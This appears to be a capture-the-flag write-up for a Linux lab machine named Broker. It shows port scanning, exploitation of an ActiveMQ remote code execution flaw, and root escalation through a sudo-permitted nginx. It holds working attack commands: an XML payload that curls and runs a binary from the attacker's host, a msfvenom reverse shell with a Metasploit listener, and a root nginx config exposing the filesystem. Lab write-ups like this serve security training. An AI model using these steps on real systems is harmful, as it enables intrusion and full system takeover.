# Broker

### Typology:

_Linux_

We start by enumerating the target ports:
```bash
nmap -sC -sV -p- --min-rate=2000 10.10.11.243

PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp    open  http     nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-title: Error 401 Unauthorized
5672/tcp  open  amqp?
|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     AMQP
|     AMQP
|     amqp:decode-error
|_    7Connection from client using unsupported AMQP attempted
8161/tcp  open  http     Jetty 9.4.39.v20210325
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  basic realm=ActiveMQRealm
|_http-server-header: Jetty(9.4.39.v20210325)
|_http-title: Error 401 Unauthorized
61616/tcp open  apachemq ActiveMQ OpenWire transport
| fingerprint-strings: 
|   NULL: 
|     ActiveMQ
|     TcpNoDelayEnabled
|     SizePrefixDisabled
|     CacheSize
|     ProviderName 
|     ActiveMQ
|     StackTraceEnabled
|     PlatformDetails 
|     Java
|     CacheEnabled
|     TightEncodingEnabled
|     MaxFrameSize
|     MaxInactivityDuration
|     MaxInactivityDurationInitalDelay
|     ProviderVersion 
|_    5.15.15
```
Summarize:

- _22 SSH port_

- _80 nginx webserver, we have 401 Unauthorized_

- _5672 AMQP we can't connect it_

- _8161 sames as 80_

- _61616 ActiveMQ_

The only way to chose is the 61616 port; a quick search about the version leaks out a CVE, this [one](https://www.prio-n.com/blog/cve-2023-46604-attacking-defending-ActiveMQ) an RCE by a crafted XML file served on a local HTTP webserver, some links below the previous one I find a [POC](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ), follow this commands:
```bash
git clone https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ.git
cd CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ
go build
```
Now the file __"poc-linux.xml"__ must be modified at line 12:
```xml
<value>curl -s -o test.elf http://<your_ip_from_vpn>:8001/test.elf; chmod +x ./test.elf; ./test.elf</value>
```
Setup a listener:
```bash
msfconsole -q -x "use multi/handler; set payload linux/x64/shell_reverse_tcp; set lhost 10.96.0.24; set lport 4444; exploit"
```
Generate the msfpayload and run the python webserver:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST={Your_Listener_IP/Host} LPORT={Your_Listener_Port} -f elf -o test.elf

python3 -m http.server 8001
```
Then in another tab we navigate in the CVE folder and we run the following command:
```bash
./ActiveMQ-RCE -i <target ip> -u http://10.96.0.24:8001
```
we have the first shell as user and we can retrieve the user flag, it's time to enumerate

The command `sudo -l` reveals a juicy information:
```bash
(ALL : ALL) NOPASSWD: /usr/sbin/nginx
```
we can load our own configuration file, I opted for a simple configuration where at the port 1337 I can see all root folder from the web:
```bash
user root;
worker_processes auto;

events {
    worker_connections 1024;
}

http {
    server {
        listen 1337;
        root /;

        location / {
            autoindex on;
        }
    }
}

sudo nginx -c /tmp/fake.conf
```
Visit the following URL: __"http://10.10.11.243:1337/"__ will give an access to the entire filesystem and we can retrieve the root flag